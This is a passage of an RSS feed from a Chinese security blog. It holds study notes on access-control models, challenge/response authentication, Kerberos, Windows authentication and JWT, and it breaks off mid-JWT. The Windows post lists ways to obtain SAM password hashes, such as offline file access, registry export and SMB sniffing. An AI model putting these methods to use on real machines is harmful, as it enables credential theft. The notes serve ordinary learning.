<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Khala • Posts by &#34;安全&#34; category</title>
        <link>https://mobius-0.github.io</link>
        <description>GLHF</description>
        <language>zh-CN</language>
        <pubDate>Tue, 06 Dec 2022 11:50:35 +0800</pubDate>
        <lastBuildDate>Tue, 06 Dec 2022 11:50:35 +0800</lastBuildDate>
        <category>Hexo</category>
        <category>shoya</category>
        <category>网站</category>
        <category>网络安全</category>
        <category>工具</category>
        <category>虚拟机</category>
        <category>安全</category>
        <category>星际争霸2</category>
        <category>平衡</category>
        <category>杂谈</category>
        <category>网易</category>
        <category>暴雪</category>
        <category>动画</category>
        <category>江南</category>
        <category>龙族</category>
        <category>小说</category>
        <category>法律法规</category>
        <category>XSS</category>
        <category>漏洞</category>
        <category>渗透测试</category>
        <category>靶场</category>
        <category>pikachu</category>
        <category>JWT</category>
        <category>Kerberos认证</category>
        <category>认证</category>
        <category>单点登录</category>
        <category>Windows</category>
        <category>挑战/应答</category>
        <category>S/Key协议</category>
        <category>权限设置</category>
        <category>虚拟化</category>
        <category>Docker</category>
        <category>镜像</category>
        <category>标准</category>
        <category>OCI</category>
        <category>CRI</category>
        <category>域名</category>
        <category>DNS</category>
        <category>WEB</category>
        <category>HTTP</category>
        <category>计算机网络</category>
        <category>IPSec</category>
        <category>VPN</category>
        <category>SSL</category>
        <category>TLS</category>
        <category>WiFi</category>
        <category>邮件</category>
        <category>网络协议</category>
        <category>入侵检测</category>
        <category>IDS</category>
        <category>IPS</category>
        <category>防御加固</category>
        <category>管理策略</category>
        <category>分工</category>
        <category>职能</category>
        <category>情报</category>
        <category>运营</category>
        <category>开发过程</category>
        <category>应急响应</category>
        <category>流程</category>
        <category>Linux</category>
        <category>攻击溯源</category>
        <category>分析模型</category>
        <category>网络攻防</category>
        <category>蜜罐</category>
        <category>隐藏</category>
        <category>诱导</category>
        <category>防御纵深</category>
        <category>访问控制</category>
        <category>过滤</category>
        <category>框架</category>
        <category>风险</category>
        <category>控制</category>
        <category>渗透</category>
        <category>信息收集</category>
        <category>痕迹清理</category>
        <category>内网</category>
        <category>后门</category>
        <category>免杀</category>
        <category>代理</category>
        <category>Shell</category>
        <category>远程连接</category>
        <category>ASP</category>
        <category>CSharp</category>
        <category>Golang</category>
        <category>Java</category>
        <category>语言</category>
        <category>反序列化</category>
        <category>混淆</category>
        <category>沙箱</category>
        <category>类</category>
        <category>JDK</category>
        <category>JavaScript</category>
        <category>PHP</category>
        <category>PowerShell</category>
        <category>Python</category>
        <category>Ruby</category>
        <category>CSRF</category>
        <category>服务器</category>
        <category>SQL注入</category>
        <category>SSRF</category>
        <category>Cache</category>
        <category>XXE</category>
        <category>XML</category>
        <category>Xpath</category>
        <category>注入</category>
        <category>函数</category>
        <category>绕过</category>
        <category>遍历</category>
        <category>包含</category>
        <category>文件</category>
        <category>目录</category>
        <category>读取</category>
        <category>上传</category>
        <category>中间件</category>
        <category>IIS</category>
        <category>Apache</category>
        <category>Nginx</category>
        <category>逻辑</category>
        <category>策略配置</category>
        <category>端口</category>
        <category>社会工程学</category>
        <category>搜索</category>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Authentication/%E6%9D%83%E9%99%90%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%9E%8B/</guid>
            <title>权限系统设计模型</title>
            <link>https://mobius-0.github.io/security/WebNote/Authentication/%E6%9D%83%E9%99%90%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%9E%8B/</link>
            <category>权限设置</category>
            <pubDate>Tue, 06 Dec 2022 11:50:35 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;常见的权限设计模式有以下几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自主访问控制 (Discretionary Access Control, DAC)&lt;/li&gt;
&lt;li&gt;强制访问控制 (Mandatory Access Control, MAC)&lt;/li&gt;
&lt;li&gt;基于角色的访问控制 (Role-Based Access Control, RBAC)&lt;/li&gt;
&lt;li&gt;基于属性的权限验证 (Attribute-Based Access Control, ABAC)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常用的概念有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户：发起操作的主体&lt;/li&gt;
&lt;li&gt;对象：发起操作的客体，即操作的对象&lt;/li&gt;
&lt;li&gt;权限：用来指代对某对象的一种 / 一类操作&lt;/li&gt;
&lt;li&gt;权限控制表 (Access Control List, ACL): 描述用户与权限之间关系的数据表&lt;/li&gt;
&lt;li&gt;权限控制矩阵 (Access Control Matrix): 一套抽象、形式化的安全性模型。这套模型描述了电脑系统中的安全保护状态，各别表示其下的每个附属子体，对于系统中的每个对象，其所拥有的权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;DAC 根据 ACL 的信息来决定用户是否能对某个对象进行操作。而拥有某个对象权限的用户，又可以将该对象的权限分配给其他用户，所以这种模型被称为自主（Discretionary）访问控制。&lt;/p&gt;
&lt;p&gt;由于 DAC 权限控制较为分散，每个用户和对象都有一些权限标识，所以引入了 MAC 。每个用户和对象都有权限标识，用户是否能操作取决于双方的权限标识关系。这种方式不能灵活的授权，适合权限控制较为严格的场景。&lt;/p&gt;
&lt;p&gt;RBAC 则是迄今为止最为普及的权限设计模型，它引入了角色 (Role) 的概念。 每个用户可以关联一个或多个角色，每个角色也可以关联一个或多个权限。 当需要新的权限配置时，可以根据需求灵活创建角色。&lt;/p&gt;
&lt;p&gt;不同于 RBAC 按角色进行关联， ABAC 根据属性进行关联。通常来说，属性分为几类：用户属性、环境属性（例如时间）、操作属性（当前操作）、对象属性。ABAC 则通过动态计算一个或一组属性来是否满足对应条件来进行授权判断。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Authentication/%E6%8C%91%E6%88%98%E5%BA%94%E7%AD%94%E6%9C%BA%E5%88%B6/</guid>
            <title>挑战/应答机制</title>
            <link>https://mobius-0.github.io/security/WebNote/Authentication/%E6%8C%91%E6%88%98%E5%BA%94%E7%AD%94%E6%9C%BA%E5%88%B6/</link>
            <category>挑战/应答</category>
            <category>S/Key协议</category>
            <pubDate>Tue, 06 Dec 2022 11:42:53 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/12/06/jfn73rPNgUbDIA5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;认证过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#认证过程&#34;&gt;#&lt;/a&gt; 认证过程&lt;/h1&gt;
&lt;p&gt;顾名思义，基于挑战 / 应答（Challenge/Response）方式的身份认证系统就是每次认证时认证服务器端都给客户端发送一个不同的 &amp;quot;挑战&amp;quot; 字串，客户端程序收到这个 &amp;quot;挑战&amp;quot; 字串后，做出相应的 &amp;quot;应答&amp;quot;, 以此机制而研制的系统。认证过程为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户向认证服务器发出请求，要求进行身份认证；&lt;/li&gt;
&lt;li&gt;认证服务器从用户数据库中查询用户是否是合法的用户，若不是，则不做进一步处理；&lt;/li&gt;
&lt;li&gt;认证服务器内部产生一个随机数，作为 &amp;quot;提问&amp;quot;，发送给客户；&lt;/li&gt;
&lt;li&gt;客户将用户名字和随机数合并，使用单向 Hash 函数（例如 MD5 算法）生成一个字节串作为应答；&lt;/li&gt;
&lt;li&gt;认证服务器将应答串与自己的计算结果比较，若二者相同，则通过一次认证；否则，认证失败；&lt;/li&gt;
&lt;li&gt;认证服务器通知&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUUlQTIlRTYlODglQjclRTglQUUlQTQlRTglQUYlODE=&#34;&gt;客户认证&lt;/span&gt;成功或失败。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以后的认证由客户不定时地发起，过程中没有了客户认证请求一步。两次认证的时间间的密钥隔不能太短，否则就给网络、客户和认证服务器带来太大的开销；也不能太长，否则不能保证用户不被他人盗用 IP 地址，一般定为 1-2 分钟。&lt;/p&gt;
&lt;h1 id=&#34;密钥的分配和管理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密钥的分配和管理&#34;&gt;#&lt;/a&gt; 密钥的分配和管理&lt;/h1&gt;
&lt;p&gt;密钥的分配由维护模块负责，当用户进行注册时，自行设定自己的口令字。用户由口令字生成。&lt;/p&gt;
&lt;p&gt;一个口令字必须经过两次口令字检查。第一次由注册程序检查，强制口令字必须有足够的长度（如 8 个字符）。口令字被加密后送入数据库中，这个口令字标记为 &#39; 未检查的 &#39;。第二次，由离线的口令字&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQTMlODAlRTYlOUYlQTUlRTUlQjclQTUlRTUlODUlQjc=&#34;&gt;检查工具&lt;/span&gt;进行检查，将&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQkMlQjElRTUlOEYlQTMlRTQlQkIlQTQ=&#34;&gt;弱口令&lt;/span&gt;字进行标记，当下一次&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOTQlQTglRTYlODglQjclRTglQUUlQTQlRTglQUYlODE=&#34;&gt;用户认证&lt;/span&gt;时，认证服务器将强制用户修改口令字。&lt;/p&gt;
&lt;p&gt;密钥的在线修改由认证服务器完成，它的过程与认证过程基本类似。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Authentication/Kerberos/</guid>
            <title>Kerberos</title>
            <link>https://mobius-0.github.io/security/WebNote/Authentication/Kerberos/</link>
            <category>Kerberos认证</category>
            <pubDate>Tue, 06 Dec 2022 11:20:53 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;Kerberos 协议起源于美国麻省理工学院 Athena 项目，基于公私钥加密体制，为分布式环境提供双向验证，在 RFC 1510 中被采纳，Kerberos 是 Windows 域环境中的默认身份验证协议。&lt;/p&gt;
&lt;p&gt;简单地说，Kerberos 提供了一种单点登录 (Single Sign-On, SSO) 的方法。考虑这样一个场景，在一个网络中有不同的服务器，比如，打印服务器、邮件服务器和文件服务器。这些服务器都有认证的需求。很自然的，不可能让每个服务器自己实现一套认证系统，而是提供一个中心认证服务器 (Authentication Server, AS) 供这些服务器使用。这样任何客户端就只需维护一个密码就能登录所有服务器。&lt;/p&gt;
&lt;p&gt;Kerberos 协议是一个基于票据 (Ticket) 的系统，在 Kerberos 系统中至少有三个角色：认证服务器 (AS)，客户端 (Client) 和普通服务器 (Server)。&lt;/p&gt;
&lt;p&gt;认证服务器对用户进行验证，并发行供用户用来请求会话票据的 TGT (票据授予票据)。票据授予服务 (TGS) 在发行给客户的 TGT 的基础上，为网络服务发行 ST (会话票据)。&lt;/p&gt;
&lt;p&gt;在 Kerberos 系统中，客户端和服务器都有一个唯一的名字，叫做 Principal。同时，客户端和服务器都有自己的密码，并且它们的密码只有自己和认证服务器 AS 知道。&lt;/p&gt;
&lt;h1 id=&#34;基本概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本概念&#34;&gt;#&lt;/a&gt; 基本概念&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Principal (安全个体)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;被认证的个体，有一个名字 (name) 和口令 (password)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;KDC (Key Distribution Center)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供 ticket 和临时的会话密钥的网络服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ticket&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个记录，用户可以用它来向服务器证明自己的身份，其中包括用户的标识、会话密钥、时间戳，以及其他一些信息。Ticket 中的大多数信息都被加密，密钥为服务器的密钥&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Authenticator&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个记录，其中包含一些最近产生的信息，产生这些信息需要用到用户和服务器之间共享的会话密钥&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Credentials&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个 ticket 加上一个秘密的会话密钥&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Authentication Server (AS)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 long-term key 认证用户&lt;/li&gt;
&lt;li&gt;AS 给予用户 ticket granting ticket 和 short-term key&lt;/li&gt;
&lt;li&gt;认证服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Ticket Granting Server (TGS)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过 short-term key 和 Ticket Granting Ticket 认证用户&lt;/li&gt;
&lt;li&gt;TGS 发放 tickets 给用户以访问其他的服务器&lt;/li&gt;
&lt;li&gt;授权和访问控制服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;简化的认证过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简化的认证过程&#34;&gt;#&lt;/a&gt; 简化的认证过程&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;客户端向服务器发起请求，请求内容是：客户端的 principal，服务器的 principal&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AS 收到请求之后，随机生成一个密码 Kc, s (session key), 并生成以下两个票据返回给客户端&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;给客户端的票据，用客户端的密码加密，内容为随机密码，session，server_principal&lt;/li&gt;
&lt;li&gt;给服务器端的票据，用服务器的密码加密，内容为随机密码，session，client_principal&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到 Kc、s，然后生成一个 Authenticator，其中主要包括当前时间和 Ts,c 的校验码，并且用 SessionKey Kc,s 加密。之后客户端将 Authenticator 和给 server 的票据同时发给服务器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器首先用自己的密码解开票据，拿到 SessionKey Kc,s，然后用 Kc,s 解开 Authenticator，并做如下检查&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查 Authenticator 中的时间戳是不是在当前时间上下 5 分钟以内，并且检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行 Replay 攻击。&lt;/li&gt;
&lt;li&gt;检查 checksum 是否正确&lt;/li&gt;
&lt;li&gt;如果都正确，客户端就通过了认证&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器段可选择性地给客户端回复一条消息来完成双向认证，内容为用 session key 加密的时间戳&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;完整的认证过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#完整的认证过程&#34;&gt;#&lt;/a&gt; 完整的认证过程&lt;/h1&gt;
&lt;p&gt;上方介绍的流程已经能够完成客户端和服务器的相互认证。但是，比较不方便的是每次认证都需要客户端输入自己的密码。&lt;/p&gt;
&lt;p&gt;因此在 Kerberos 系统中，引入了一个新的角色叫做：票据授权服务 (TGS - Ticket Granting Service)，它的地位类似于一个普通的服务器，只是它提供的服务是为客户端发放用于和其他服务器认证的票据。&lt;/p&gt;
&lt;p&gt;这样，Kerberos 系统中就有四个角色：认证服务器 (AS)，客户端 (Client)，普通服务器 (Server) 和票据授权服务 (TGS)。这样客户端初次和服务器通信的认证流程分成了以下 6 个步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;客户端向 AS 发起请求，请求内容是：客户端的 principal，票据授权服务器的 rincipal&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AS 收到请求之后，随机生成一个密码 Kc, s (session key), 并生成以下两个票据返回给客户端：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;给客户端的票据，用客户端的密码加密，内容为随机密码，session，tgs_principal&lt;/li&gt;
&lt;li&gt;给 tgs 的票据，用 tgs 的密码加密，内容为随机密码，session，client_principal&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;客户端拿到了第二步中的两个票据后，首先用自己的密码解开票据，得到 Kc、s，然后生成一个 Authenticator，其中主要包括当前时间和 Ts,c 的校验码，并且用 SessionKey Kc,s 加密。之后客户端向 tgs 发起请求，内容包括:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Authenticator&lt;/li&gt;
&lt;li&gt;给 tgs 的票据同时发给服务器&lt;/li&gt;
&lt;li&gt;server_principal&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TGS 首先用自己的密码解开票据，拿到 SessionKey Kc,s，然后用 Kc,s 解开 Authenticator，并做如下检查&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查 Authenticator 中的时间戳是不是在当前时间上下 5 分钟以内，并且检查该时间戳是否首次出现。如果该时间戳不是第一次出现，那说明有人截获了之前客户端发送的内容，进行 Replay 攻击。&lt;/li&gt;
&lt;li&gt;检查 checksum 是否正确&lt;/li&gt;
&lt;li&gt;如果都正确，客户端就通过了认证&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;tgs 生成一个 session key 组装两个票据给客户端&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用客户端和 tgs 的 session key 加密的票据，包含新生成的 session key 和 server_principal&lt;/li&gt;
&lt;li&gt;用服务器的密码加密的票据，包括新生成的 session key 和 client principal&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;客户端收到两个票据后，解开自己的，然后生成一个 Authenticator，发请求给服务器，内容包括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Authenticator&lt;/li&gt;
&lt;li&gt;给服务器的票据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器收到请求后，用自己的密码解开票据，得到 session key，然后用 session key 解开 authenticator 对可无端进行验证&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务器可以选择返回一个用 session key 加密的之前的是时间戳来完成双向验证&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;客户端通过解开消息，比较发回的时间戳和自己发送的时间戳是否一致，来验证服务器&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;优缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#优缺点&#34;&gt;#&lt;/a&gt; 优缺点&lt;/h1&gt;
&lt;h2 id=&#34;优点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#优点&#34;&gt;#&lt;/a&gt; 优点&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;密码不易被窃听&lt;/li&gt;
&lt;li&gt;密码不在网上传输&lt;/li&gt;
&lt;li&gt;密码猜测更困难&lt;/li&gt;
&lt;li&gt;票据被盗之后难以使用，因为需要配合认证头来使用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;9852-缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#9852-缺点&#34;&gt;#&lt;/a&gt; 9.8.5.2. 缺点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;缺乏撤销机制&lt;/li&gt;
&lt;li&gt;引入了复杂的密钥管理&lt;/li&gt;
&lt;li&gt;需要时钟同步&lt;/li&gt;
&lt;li&gt;伸缩性受限&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;规范&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#规范&#34;&gt;#&lt;/a&gt; 规范&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzE1MTA=&#34;&gt;RFC 1510 The Kerberos Network Authentication Service&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pld2VzL2FydGljbGUvZGV0YWlscy8yMDc5MjAyMQ==&#34;&gt;Kerberos 认证流程详解&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击&#34;&gt;#&lt;/a&gt; 攻击&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvYXNpYS0xNy9tYXRlcmlhbHMvYXNpYS0xNy1IYXJ0LURlbGVnYXRlLVRvLVRoZS1Ub3AtQWJ1c2luZy1LZXJiZXJvcy1Gb3ItQXJiaXRyYXJ5LUltcGVyc29uYXRpb25zLUFuZC1SQ0Utd3AucGRm&#34;&gt;Delegate to the Top: Abusing Kerberos for arbitrary impersonations and RCE&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLXNmdS8zYmZmNTg2NC04MTM1LTQwMGUtYmRkOS0zM2I1NTIwNTFkOTQ/cmVkaXJlY3RlZGZyb209TVNETg==&#34;&gt;Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvcHJldmlvdXMtdmVyc2lvbnMvbXNwLW4tcC9mZjY0OTQyOSh2PXBhbmRwLjEwKQ==&#34;&gt;Kerberos Technical Supplement for Windows&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMjkz&#34;&gt;Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Authentication/Windows%E8%AE%A4%E8%AF%81/</guid>
            <title>Windows认证</title>
            <link>https://mobius-0.github.io/security/WebNote/Authentication/Windows%E8%AE%A4%E8%AF%81/</link>
            <category>认证</category>
            <category>Windows</category>
            <pubDate>Tue, 06 Dec 2022 11:18:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;本地用户认证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#本地用户认证&#34;&gt;#&lt;/a&gt; 本地用户认证&lt;/h1&gt;
&lt;p&gt;Windows 在进行本地登录认证时操作系统会使用用户输入的密码作为凭证去与系统中的密码进行对比验证。通过  &lt;code&gt;winlogon.exe&lt;/code&gt;  接收用户输入传递至  &lt;code&gt;lsass.exe&lt;/code&gt;  进行认证。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;winlogon.exe&lt;/code&gt;  用于在用户注销、重启、锁屏后显示登录界面。  &lt;code&gt;lsass.exe&lt;/code&gt;  用于将明文密码变成 NTLM Hash 的形式与 SAM 数据库比较认证。&lt;/p&gt;
&lt;h1 id=&#34;sam&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sam&#34;&gt;#&lt;/a&gt; SAM&lt;/h1&gt;
&lt;p&gt;安全帐户管理器 (Security Accounts Manager，SAM) 是 Windows 操作系统管理用户帐户的安全所使用的一种机制。用来存储 Windows 操作系统密码的数据库文件为了避免明文密码泄漏 SAM 文件中保存的是明文密码在经过一系列算法处理过的 Hash 值被保存的 Hash 分为 LM Hash、NTLM Hash。当用户进行身份认证时会将输入的 Hash 值与 SAM 文件中保存的 Hash 值进行对比。&lt;/p&gt;
&lt;p&gt;SAM 文件保存于  &lt;code&gt;%SystemRoot%\system32\config\sam&lt;/code&gt;  中，在注册表中保存在  &lt;code&gt;HKEY_LOCAL_MACHINE\SAM\SAM&lt;/code&gt;  ，  &lt;code&gt;HKEY_LOCAL_MACHINE\SECURITY\SAM&lt;/code&gt;  。 在正常情况下 SAM 文件处于锁定状态不可直接访问、复制、移动仅有 system 用户权限才可以读写该文件。&lt;/p&gt;
&lt;h1 id=&#34;密码破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码破解&#34;&gt;#&lt;/a&gt; 密码破解&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过物理接触主机、启动其他操作系统来获取 Windows 分区上的  &lt;code&gt;%SystemRoot%\system32\config\sam&lt;/code&gt;  文件&lt;/li&gt;
&lt;li&gt;获取  &lt;code&gt;%SystemRoot%\repair\sam._&lt;/code&gt;  文件。&lt;/li&gt;
&lt;li&gt;使用工具从注册表中导出 SAM 散列值&lt;/li&gt;
&lt;li&gt;从网络中嗅探分析 SMB 报文，从中获取密码散列&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;spnego&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spnego&#34;&gt;#&lt;/a&gt; SPNEGO&lt;/h1&gt;
&lt;p&gt;SPNEGO (SPNEGO: Simple and Protected GSS-API Negotiation) 是微软提供的一种使用 GSS-API 认证机制的安全协议，用于使 Webserver 共享 Windows Credentials，它扩展了 Kerberos。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Authentication/JWT/</guid>
            <title>JWT</title>
            <link>https://mobius-0.github.io/security/WebNote/Authentication/JWT/</link>
            <category>JWT</category>
            <pubDate>Tue, 06 Dec 2022 10:55:21 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（(RFC 7519). 该 token 被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该 token 也可直接被用于认证，也可被加密。&lt;/p&gt;
&lt;h1 id=&#34;构成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#构成&#34;&gt;#&lt;/a&gt; 构成&lt;/h1&gt;
&lt;p&gt;分为三个部分，分别为头部（Header）、声明（Claims，也可以称为负载 Payload）、证书（Signature），三个部分以英文句号 &lt;code&gt;.&lt;/code&gt;  隔开。其中 header 是声明的类型和加密使用的算法。下面是一个用 HS256 生成 JWT 的代码例子： &lt;code&gt;HMACSHA256(base64UrlEncode(header) + &amp;quot;.&amp;quot; +base64UrlEncode(payload),secret)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;头部（Header）:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;
  &amp;quot;alg&amp;quot;:&amp;quot;HS256&amp;quot;,
  &amp;quot;typ&amp;quot;:&amp;quot;JWT&amp;quot;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;alg：是说明这个 JWT 的签名使用的算法的参数，常见值用 HS256（默认），HS512 等，也可以为 None。HS256 表示 HMAC SHA256。&lt;br /&gt;
typ：说明这个 token 的类型为 JWT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;声明（Claims）:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;
  &amp;quot;exp&amp;quot;: 1416471934,
  &amp;quot;user_name&amp;quot;: &amp;quot;user&amp;quot;,
  &amp;quot;scope&amp;quot;: [
    &amp;quot;read&amp;quot;,
    &amp;quot;write&amp;quot;
  ],
  &amp;quot;authorities&amp;quot;: [
    &amp;quot;ROLE_ADMIN&amp;quot;,
    &amp;quot;ROLE_USER&amp;quot;
  ],
  &amp;quot;jti&amp;quot;: &amp;quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&amp;quot;,
  &amp;quot;client_id&amp;quot;: &amp;quot;my-client-with-secret&amp;quot;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
